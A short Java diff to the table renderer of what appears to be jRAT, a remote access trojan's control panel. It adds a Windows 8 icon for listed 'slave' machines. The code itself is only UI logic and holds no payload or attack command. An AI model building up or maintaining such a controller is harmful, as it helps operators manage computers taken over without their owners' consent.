@@ -24,6 +24,7 @@ import su.jrat.common.Version;
 public class MainTableRenderer extends DefaultTableCellRenderer {
 
 	public static final ImageIcon OS_WIN = IconUtils.getIcon("os");
+	public static final ImageIcon OS_WIN8 = IconUtils.getIcon("os_win8");
 	public static final ImageIcon OS_MAC = IconUtils.getIcon("os_mac");
 	public static final ImageIcon OS_LINUX = IconUtils.getIcon("os_linux");
 	public static final ImageIcon OS_OTHERS = IconUtils.getIcon("last_modified");
@@ -49,7 +50,11 @@ public class MainTableRenderer extends DefaultTableCellRenderer {
 			lbl.setIcon(IconUtils.getPingIcon(slave));
 		} else if (column == 6) {
 			if (slave.getOS() == OperatingSystem.WINDOWS) {
-				lbl.setIcon(OS_WIN);
+				if (slave.getOperatingSystem().startsWith("Windows 8")) {
+					lbl.setIcon(OS_WIN8);
+				} else {
+					lbl.setIcon(OS_WIN);
+				}
 			} else if (slave.getOS() == OperatingSystem.OSX) {
 				lbl.setIcon(OS_MAC);
 			} else if (slave.getOS() == OperatingSystem.LINUX) {
